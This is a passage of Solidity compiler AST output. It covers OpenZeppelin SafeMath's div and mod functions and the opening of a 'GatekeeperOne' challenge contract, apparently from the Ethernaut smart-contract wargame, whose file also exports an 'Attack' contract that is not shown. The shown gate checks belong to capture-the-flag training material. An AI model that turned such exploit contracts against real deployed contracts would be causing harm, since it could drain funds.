													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 324,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 308,
														"src": "6402:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 325,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 310,
														"src": "6406:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6402:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 316,
												"id": 327,
												"nodeType": "Return",
												"src": "6395:12:0"
											}
										]
									},
									"documentation": {
										"id": 306,
										"nodeType": "StructuredDocumentation",
										"src": "5601:646:0",
										"text": " @dev Returns the integer division of two unsigned integers, reverting with custom message on\n division by zero. The result is rounded towards zero.\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {tryDiv}.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 329,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 313,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 308,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6265:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 307,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6265:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 310,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6276:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 309,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6276:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 312,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6287:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 311,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6287:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6264:50:0"
									},
									"returnParameters": {
										"id": 316,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 315,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6338:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 314,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6338:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6337:9:0"
									},
									"scope": 354,
									"src": "6252:162:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 352,
										"nodeType": "Block",
										"src": "7155:67:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 344,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 342,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 334,
																"src": "7173:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 343,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7177:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "7173:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 345,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 336,
															"src": "7180:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 341,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "7165:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 346,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7165:28:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 347,
												"nodeType": "ExpressionStatement",
												"src": "7165:28:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 350,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 348,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 332,
														"src": "7210:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 349,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 334,
														"src": "7214:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7210:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 340,
												"id": 351,
												"nodeType": "Return",
												"src": "7203:12:0"
											}
										]
									},
									"documentation": {
										"id": 330,
										"nodeType": "StructuredDocumentation",
										"src": "6420:635:0",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting with custom message when dividing by zero.\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {tryMod}.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 353,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 337,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 332,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7073:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 331,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7073:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 334,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7084:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 333,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7084:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 336,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7095:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 335,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7095:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7072:50:0"
									},
									"returnParameters": {
										"id": 340,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 339,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7146:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 338,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7146:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7145:9:0"
									},
									"scope": 354,
									"src": "7060:162:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 355,
							"src": "630:6594:0"
						}
					],
					"src": "33:7192:0"
				},
				"id": 0
			},
			"contracts/13_Gatekeeper1.sol": {
				"ast": {
					"absolutePath": "contracts/13_Gatekeeper1.sol",
					"exportedSymbols": {
						"Attack": [
							536
						],
						"GatekeeperOne": [
							469
						]
					},
					"id": 537,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 356,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "@openzeppelin/contracts@v3.4.2/math/SafeMath.sol",
							"file": "@openzeppelin/contracts@v3.4.2/math/SafeMath.sol",
							"id": 357,
							"nodeType": "ImportDirective",
							"scope": 537,
							"sourceUnit": 355,
							"src": "57:58:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 469,
							"linearizedBaseContracts": [
								469
							],
							"name": "GatekeeperOne",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 360,
									"libraryName": {
										"contractScope": null,
										"id": 358,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 354,
										"src": "151:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$354",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "145:27:1",
									"typeName": {
										"id": 359,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "164:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "9db31d77",
									"id": 362,
									"mutability": "mutable",
									"name": "entrant",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 469,
									"src": "175:22:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 361,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "175:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 373,
										"nodeType": "Block",
										"src": "255:50:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															"id": 369,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 365,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "269:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 366,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "269:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 367,
																	"name": "tx",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -26,
																	"src": "283:2:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_transaction",
																		"typeString": "tx"
																	}
																},
																"id": 368,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "origin",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "283:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "269:23:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 364,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "261:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 370,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "261:32:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 371,
												"nodeType": "ExpressionStatement",
												"src": "261:32:1"
											},
											{
												"id": 372,
												"nodeType": "PlaceholderStatement",
												"src": "299:1:1"
											}
										]
									},
									"documentation": null,
									"id": 374,
									"name": "gateOne",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
										"id": 363,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "252:2:1"
									},
									"src": "236:69:1",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 387,
										"nodeType": "Block",
										"src": "446:51:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 383,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "38313931",
																		"id": 380,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "474:4:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_8191_by_1",
																			"typeString": "int_const 8191"
																		},
																		"value": "8191"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_8191_by_1",
																			"typeString": "int_const 8191"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [],
																		"expression": {
																			"argumentTypes": [],
																			"id": 377,
																			"name": "gasleft",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -7,
																			"src": "460:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_gasleft_view$__$returns$_t_uint256_$",
																				"typeString": "function () view returns (uint256)"
																			}
																		},
																		"id": 378,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "460:9:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 379,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "mod",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 281,
																	"src": "460:13:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																		"typeString": "function (uint256,uint256) pure returns (uint256)"
																	}
																},
																"id": 381,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "460:19:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 382,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "483:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "460:24:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 376,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "452:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 384,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "452:33:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 385,
												"nodeType": "ExpressionStatement",
												"src": "452:33:1"
											},
											{
												"id": 386,
												"nodeType": "PlaceholderStatement",
												"src": "491:1:1"
											}
										]
									},
									"documentation": null,
									"id": 388,
									"name": "gateTwo",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
										"id": 375,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "443:2:1"
									},
									"src": "427:70:1",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 445,
										"nodeType": "Block",
										"src": "565:571:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															},
															"id": 407,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 397,
																				"name": "_gateKey",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 390,
																				"src": "653:8:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			],
																			"id": 396,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "646:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint64_$",
																				"typeString": "type(uint64)"
																			},
																			"typeName": {
																				"id": 395,
																				"name": "uint64",
																				"nodeType": "ElementaryTypeName",
																				"src": "646:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 398,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "646:16:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	],
																	"id": 394,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "639:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint32_$",
																		"typeString": "type(uint32)"
																	},
																	"typeName": {
																		"id": 393,
																		"name": "uint32",
																		"nodeType": "ElementaryTypeName",
																		"src": "639:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 399,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "639:24:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint32",
																	"typeString": "uint32"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 404,
																				"name": "_gateKey",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 390,
																				"src": "681:8:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			],
																			"id": 403,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "674:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint64_$",
																				"typeString": "type(uint64)"
																			},
																			"typeName": {
																				"id": 402,
																				"name": "uint64",
																				"nodeType": "ElementaryTypeName",
																				"src": "674:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 405,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "674:16:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	],
																	"id": 401,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "667:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint16_$",
																		"typeString": "type(uint16)"
																	},
																	"typeName": {
																		"id": 400,
																		"name": "uint16",
																		"nodeType": "ElementaryTypeName",
																		"src": "667:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 406,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "667:24:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint16",
																	"typeString": "uint16"
																}
															},
															"src": "639:52:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274206f6e65",
															"id": 408,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "693:43:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_29b1771185c3518a576bd8f9c5bd6f23be4870a353b1401c23e337f30a5d0cb8",
																"typeString": "literal_string \"GatekeeperOne: invalid gateThree part one\""
															},
															"value": "GatekeeperOne: invalid gateThree part one"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_29b1771185c3518a576bd8f9c5bd6f23be4870a353b1401c23e337f30a5d0cb8",
																"typeString": "literal_string \"GatekeeperOne: invalid gateThree part one\""
															}
														],
														"id": 392,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "631:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 409,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "631:106:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 410,
												"nodeType": "ExpressionStatement",
												"src": "631:106:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															},
															"id": 423,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 416,
																				"name": "_gateKey",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 390,
																				"src": "861:8:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			],
																			"id": 415,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "854:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint64_$",
																				"typeString": "type(uint64)"
																			},
																			"typeName": {
																				"id": 414,
																				"name": "uint64",
																				"nodeType": "ElementaryTypeName",
																				"src": "854:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 417,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "854:16:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	],
																	"id": 413,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "847:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint32_$",
																		"typeString": "type(uint32)"
																	},
																	"typeName": {
																		"id": 412,
																		"name": "uint32",
																		"nodeType": "ElementaryTypeName",
																		"src": "847:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 418,
